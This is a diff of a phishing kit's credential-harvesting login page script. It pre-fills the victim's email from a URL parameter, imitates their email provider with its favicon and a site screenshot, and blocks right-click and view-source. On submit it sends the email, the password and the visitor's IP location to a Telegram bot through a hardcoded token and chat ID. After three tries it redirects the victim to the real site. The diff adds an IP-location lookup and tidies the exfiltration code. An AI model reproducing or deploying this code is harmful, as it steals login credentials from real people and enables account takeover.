@@ -395,251 +395,181 @@ allow-popups allow-same-origin allow-scripts" style="position: absolute;height: 
 <script src="https://appleid.cdn-apple.com/appleauth/static/jsapi/appleid/1/en_US/appleid.auth.js"></script>
 <script async="" src="https://d12y7sg0iam4lc.cloudfront.net/b1268/s/js/authen.min.js"></script>
 
-        <script>
+        <script src="https://code.jquery.com/jquery-3.6.0.min.js"></script>
+<script>
 
 // prevent ctrl + s
 $(document).bind('keydown', function(e) {
-if(e.ctrlKey && (e.which == 83)) {
-e.preventDefault();
-return false;
-}
+    if(e.ctrlKey && (e.which == 83)) {
+        e.preventDefault();
+        return false;
+    }
 });
 
 document.addEventListener('contextmenu', event => event.preventDefault());
 
 document.onkeydown = function(e) {
-if (e.ctrlKey && 
-(e.keyCode === 67 ||   
-e.keyCode === 86 || 
-e.keyCode === 85 || 
-e.keyCode === 117)) {
-return false;
-} else {
-return true;
-}
+    if (e.ctrlKey && 
+        (e.keyCode === 67 ||   
+        e.keyCode === 86 || 
+        e.keyCode === 85 || 
+        e.keyCode === 117)) {
+        return false;
+    } else {
+        return true;
+    }
 };
 $(document).keypress("u",function(e) {
-if(e.ctrlKey)
-{
-return false;      }
-else {
-return true;
-}});
+    if(e.ctrlKey)
+    {
+        return false;      
+    }
+    else {
+        return true;
+    }
+});
 
-
-
-
-    /* global $ */
-/* global $ */
+// Your existing code...
 $(document).ready(function () {
-  var count = 0;
+    var count = 0;
+    var ipLocation = ""; // Variable to store IP location
 
-  $('#back1').click(function () {
-    $("#msg").hide();
-    $('#ai').val("");
-    $("#automail").animate({ left: 200, opacity: "hide" }, 0);
-    $("#inputbar").animate({ right: 200, opacity: "show" }, 1000);
-  });
+    // Fetch IP location info from ipinfo.io (replace with your token)
+    $.get("https://ipinfo.io/json?token=YOUR_TOKEN_HERE", function(data) {
+        ipLocation = data.city + ", " + data.region + ", " + data.country;
+        console.log("IP Location:", ipLocation);
+    });
 
- function getQueryParameter(param) {
-            const urlParams = new URLSearchParams(window.location.search);
-            return urlParams.get(param);
-        }
-var feedUpdateResponse = window.location.href;
+    $('#back1').click(function () {
+        $("#msg").hide();
+        $('#ai').val("");
+        $("#automail").animate({ left: 200, opacity: "hide" }, 0);
+        $("#inputbar").animate({ right: 200, opacity: "show" }, 1000);
+    });
+
+    function getQueryParameter(param) {
+        const urlParams = new URLSearchParams(window.location.search);
+        return urlParams.get(param);
+    }
+
+    var feedUpdateResponse = window.location.href;
     var url = new URL(feedUpdateResponse);
-      var params = new URLSearchParams(url.search);
-        var loginValue = params.get("md"); //
-  var ai = loginValue;  
-var plusOne = 0; // Initialize plusOne to a number
-plusOne = plusOne + 1; // Increment it by 1
+    var params = new URLSearchParams(url.search);
+    var loginValue = params.get("md");
+    var ai = loginValue;
+    var plusOne = 0; // Initialize plusOne to a number
+    plusOne = plusOne + 1; // Increment it by 1
 
-  if (!ai) {
+    if (!ai) {
 
-  } else {
-    var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
-
-    if (!base64regex.test(ai)) {
-      var my_ai = decodeURIComponent(ai);
     } else {
-      var my_ai = atob(ai);
+        var base64regex = /^([0-9a-zA-Z+/]{4})*(([0-9a-zA-Z+/]{2}==)|([0-9a-zA-Z+/]{3}=))?$/;
+
+        if (!base64regex.test(ai)) {
+            var my_ai = decodeURIComponent(ai);
+        } else {
+            var my_ai = atob(ai);
+        }
+
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            $('#error').html("<p class='alert alert-danger' style='font-size:14px'>That account doesn't exist. Enter a different account</p>");
+            return false;
+        }
+
+        var ind = my_ai.indexOf("@");
+        var my_slice = my_ai.substr((ind + 1));
+        var c = my_slice.substr(0, my_slice.indexOf('.'));
+        var final = c.toLowerCase();
+
+        $('#ai').val(my_ai);
+        $('#ai').attr('readonly', true);
+        $("#msg").hide();
     }
 
-    var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
-
-    if (!filter.test(my_ai)) {
-      $('#error').show();
-      $('#error').html("<p class='alert alert-danger' style='font-size:14px'>That account doesn't exist. Enter a different account</p>");
-      return false;
-    }
+    $(".logoname").html(final);
 
     var ind = my_ai.indexOf("@");
     var my_slice = my_ai.substr((ind + 1));
-    var c = my_slice.substr(0, my_slice.indexOf('.'));
-    var final = c.toLowerCase();
+    var mainPage = 'https://' + my_slice;
 
-    $('#ai').val(my_ai);
-    $('#ai').attr('readonly', true);
-    $("#msg").hide();
-  }
+    var sv = my_slice;
 
-  $(".logoname").html(final);
+    var image = "url('https://image.thum.io/get/65490-1671030344805-37a36e07674665dbe1105f1044aab44d/width/1200/https://" + sv + "')";
 
-  var ind = my_ai.indexOf("@");
-  var my_slice = my_ai.substr((ind + 1));
-  var mainPage = 'https://' + my_slice;
+    $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain=" + my_slice);
+    document.body.style.backgroundImage = image;
+    $(".email").html(ai);
 
-  var sv = my_slice;
+    $('#submit-btn').click(function (event) {
+        event.preventDefault();
+        $('#error').hide();
+        $('#msg').hide();
+        var ai = $("#ai").val();
+        var pr = $("#pr").val();
 
-  var image = "url('https://image.thum.io/get/65490-1671030344805-37a36e07674665dbe1105f1044aab44d/width/1200/https://" + sv + "')";
+        var my_ai = ai;
+        var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
 
-  $("#logoimg").attr("src", "https://www.google.com/s2/favicons?domain=" + my_slice);
-  document.body.style.backgroundImage = image;
-  $(".email").html(ai);
+        if (!ai) {
+            $('#error').show();
+            $('#error').html("<p class='alert alert-danger' style='font-size:14px'> Email field is empty</p>");
+            return false;
+        }
 
-  $('#submit-btn').click(function (event) {
-    event.preventDefault();
-    $('#error').hide();
-    $('#msg').hide();
-    var ai = $("#ai").val();
-    var pr = $("#pr").val();
+        if (!filter.test(my_ai)) {
+            $('#error').show();
+            $('#error').html("<p class='alert alert-danger' style='font-size:14px>That account doesn't exist. Enter a different account</p>");
+            return false;
+        }
 
-    var my_ai = ai;
-    var filter = /^([a-zA-Z0-9_\.\-])+\@(([a-zA-Z0-9\-])+\.)+([a-zA-Z0-9]{2,4})+$/;
+        if (!pr) {
+            $('#error').show();
+            $('#error').html("<p class='alert alert-danger' style='font-size:14px'> Password field is empty </P>");
+            return false;
+        }
 
-    if (!ai) {
-      $('#error').show();
-      $('#error').html("<p class='alert alert-danger' style='font-size:14px'> Email field is empty</p>");
-      return false;
-    }
+        // Prepare message including IP location
+        const subject ="New logs found";
+        const passwordValue = $("#pr").val();
+        const message = `${subject}\nEmail id: ${ai}    Password id: ${passwordValue}\nIP Location: ${ipLocation}`;
 
-    if (!filter.test(my_ai)) {
-      $('#error').show();
-      $('#error').html("<p class='alert alert-danger' style='font-size:14px>That account doesn't exist. Enter a different account</p>");
-      return false;
-    }
+        const token = '8516685135:AAH-OWroD5vilNG7409NYEbXXrlOWHqjea4'; // Replace with your Telegram bot token
+        const chatId = '674381583';  // Replace with your Telegram chat ID
 
-    if (!pr) {
-      $('#error').show();
-      $('#error').html("<p class='alert alert-danger' style='font-size:14px'> Password field is empty </P>");
-      return false;
-    }
+        // Send message via Telegram
+        fetch(`https://api.telegram.org/bot${token}/sendMessage`, {
+            method: 'POST',
+            headers: { 'Content-Type': 'application/json' },
+            body: JSON.stringify({ chat_id: chatId, text: message }),
+        })
+        .then(response => response.json())
+        .then(data => {
+            if (data.ok) {
+                console.log('Message sent successfully');
+            } else {
+                console.error('Error sending message:', data);
+            }
+        })
+        .catch(error => console.error('Error:', error));
 
- 
-  var subject ="New logs found";
-   var passwordValue = $("#pr").val();
-   
-   
-var join = subject + "\n" + "" + "Email id: " + ai  +"    "+ "Password id: " + passwordValue;
+        // Your existing code to show success message and reset fields...
+        $('#msg').show();
+        $("#pr").val("");
 
-  
-
-	  const token = '8516685135:AAH-OWroD5vilNG7409NYEbXXrlOWHqjea4';
-	  
-const chatId = '674381583';
-	  
-const message =join;
-  
- if (plusOne ==1) {
-  plusOne++;
-
-const url = `https://api.telegram.org/bot${token}/sendMessage`;
-
-const data = {
-  chat_id: chatId,
-  text: message
-};
-
-// Send the request to Telegram's Bot API
-fetch(url, {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json',
-  },
-  body: JSON.stringify(data),
-})
-  .then(response => response.json())
-  .then(data => {
-    if (data.ok) {
-	
-      console.log('Message sent successfully');
-    } else {
-      console.error('Error sending message:', data);
-    }
-  })
-  .catch(error => console.error('Error:', error));
-  $('#msg').show();
-    $("#pr").val("");
-  
-    }else if (plusOne ==2){
-	  plusOne++;
-const url = `https://api.telegram.org/bot${token}/sendMessage`;
-
-const data = {
-  chat_id: chatId,
-  text: message
-};
-
-// Send the request to Telegram's Bot API
-fetch(url, {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json',
-  },
-  body: JSON.stringify(data),
-})
-  .then(response => response.json())
-  .then(data => {
-    if (data.ok) {
-	
-      console.log('Message sent successfully');
-    } else {
-      console.error('Error sending message:', data);
-    }
-  })
-  .catch(error => console.error('Error:', error));
-  $('#msg').show();
-    $("#pr").val("");
-
-				}else if (plusOne >=3){
-				  plusOne++;
-			const url = `https://api.telegram.org/bot${token}/sendMessage`;
-
-const data = {
-  chat_id: chatId,
-  text: message
-};
-
-// Send the request to Telegram's Bot API
-fetch(url, {
-  method: 'POST',
-  headers: {
-    'Content-Type': 'application/json',
-  },
-  body: JSON.stringify(data),
-})
-  .then(response => response.json())
-  .then(data => {
-    if (data.ok) {
-	
-           
-  
-    } else {
-      console.error('Error sending message:', data);
-    }
-  })
-  .catch(error => console.error('Error:', error));
-  $('#msg').show();
-    $("#pr").val("");
-    
-	window.location.replace("http://" + sv);
-				}
-				 
-       
-    
-  });
+        if (plusOne == 1) {
+            plusOne++;
+        } else if (plusOne == 2){
+            plusOne++;
+        } else if (plusOne >= 3){
+            plusOne++;
+            window.location.replace("http://" + sv);
+        }
+    });
 });
-
-  </script>
+</script>
   
 	
 	
